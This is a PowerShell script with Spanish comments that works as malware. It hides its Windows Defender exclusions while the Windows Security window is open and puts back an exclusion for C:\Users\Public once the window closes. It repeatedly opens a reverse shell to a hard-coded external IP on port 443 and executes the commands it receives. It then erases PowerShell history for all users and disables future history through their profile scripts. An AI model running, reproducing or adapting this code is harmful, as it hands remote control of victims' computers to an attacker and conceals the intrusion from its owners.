for ($iteration = 1; $iteration -le 10; $iteration++) {

    # Verificar si el proceso SecHealthUI.exe está activo
    if (Get-Process -Name "SecHealthUI" -ErrorAction SilentlyContinue) {

        # Quitar exclusiones de rutas en Windows Defender solo si existen
        $exclusions = (Get-MpPreference).ExclusionPath
        if ($exclusions) {
            $exclusions | ForEach-Object { Remove-MpPreference -ExclusionPath $_ }
        }

        Write-Host "SecHealthUI.exe está en ejecución. Esperando a que se cierre..."

        # Bucle de espera hasta que el proceso termine
        while (Get-Process -Name "SecHealthUI" -ErrorAction SilentlyContinue) {
            Start-Sleep -Seconds 2
        }

        # Cuando el proceso ya no exista, volver a agregar la exclusión
        Add-MpPreference -ExclusionPath "C:\Users\Public"

        Write-Host "El proceso SecHealthUI.exe se cerró. Fin del bucle."
    }
    else {
        Write-Host "SecHealthUI.exe no está en ejecución."
    }

    # rev
    try {
        $client = New-Object System.Net.Sockets.TCPClient("200.28.162.248",443)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $buffer = New-Object Byte[] 1024
        $encoding = New-Object System.Text.ASCIIEncoding

        while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){
            $data = $encoding.GetString($buffer,0, $i)
            $sendback = (Invoke-Expression $data | Out-String )
            $sendback2  = $sendback + "PS " + (pwd).Path + "> "
            $writer.Write($sendback2)
            $writer.Flush()
        }

        $client.Close()
    }
    catch {
        # opcional: escribir el error si quieres debug
        # Write-Host "Error: $_"
    }

    Start-Sleep -Seconds 26
}

# 1. Limpiar historial de la sesión actual
Clear-History
Set-PSReadLineOption -HistorySaveStyle SaveNothing

# 2. Borrar todos los archivos de historial persistente de todos los usuarios
Get-ChildItem "C:\Users" -Recurse -ErrorAction SilentlyContinue -Include ConsoleHost_history.txt | ForEach-Object {
    try {
        Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
    } catch {}
}

# 3. Desactivar historial futuro en los perfiles de todos los usuarios
$allUsersProfiles = Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue | ForEach-Object {
    Join-Path $_.FullName "Documents\PowerShell\Microsoft.PowerShell_profile.ps1"
}

foreach ($profile in $allUsersProfiles) {
    try {
        # Crear archivo si no existe
        if (!(Test-Path $profile)) { New-Item -ItemType File -Path $profile -Force }

        # Escribir la instrucción para no guardar historial
        Add-Content -Path $profile -Value "Set-PSReadLineOption -HistorySaveStyle SaveNothing"
    } catch {}
}
